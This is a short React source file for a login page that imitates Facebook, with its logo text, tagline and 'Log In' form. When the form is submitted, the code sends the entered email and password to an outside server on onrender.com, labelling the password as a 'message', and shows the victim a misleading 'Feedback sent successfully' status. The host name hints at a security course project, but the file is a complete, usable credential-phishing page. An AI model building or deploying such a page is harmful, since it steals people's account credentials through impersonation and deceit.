import React, { useState } from "react";
import './app.css'

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [status, setStatus] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevent page refresh
    setStatus("Sending...");

    try {
      const response = await fetch("https://projet-securite-lo1c.onrender.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, message: password }), // sending password as "message" for example
      });

      if (response.ok) {
        setStatus("Feedback sent successfully!");
        setEmail("");
        setPassword("");
      } else {
        setStatus("Error sending feedback.");
      }
    } catch (err) {
      console.error(err);
      setStatus("Network error.");
    }
  };

  return (
    <div className="content">
      <div className="flex-div">
        <div className="name-content">
          <h1 className="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="email"
            placeholder="Email or Phone Number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            name="passwords"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit" className="login">
            Log In
          </button>
          <a href="#">Forgot Password ?</a>
          <hr />
          <button type="button" className="create-account">
            Create New Account
          </button>
        </form>

        {status && <p>{status}</p>}
      </div>
    </div>
  );
}
